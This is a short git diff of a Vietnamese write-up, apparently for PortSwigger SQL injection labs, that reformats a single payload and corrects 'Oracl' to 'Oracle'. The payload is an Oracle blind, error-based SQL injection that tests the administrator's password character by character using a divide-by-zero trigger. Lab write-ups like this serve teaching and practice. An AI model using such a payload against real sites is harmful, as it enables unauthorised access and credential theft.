@@ -19,7 +19,7 @@ Tiếp theo là bước kiểm tra độ dài và mật khẩu
 
 ![image](https://github.com/vanniichan/Portswigger/assets/112863484/0ad5f5c2-65d1-456c-805b-20ba508dc1fa)
 
-' AND (SELECT CASE WHEN substr(password,1,1) ='a' THEN TO_CHAR (1/0) ELSE 'a' END FROM users WHERE username= 'administrator')='a --a (Oracl)
+`' AND (SELECT CASE WHEN substr(password,1,1) ='a' THEN TO_CHAR (1/0) ELSE 'a' END FROM users WHERE username= 'administrator')='a --a (Oracle)`
 
 ![image](https://github.com/vanniichan/Portswigger/assets/112863484/cf468eed-f105-45dd-8bb5-a1b659784149)
 
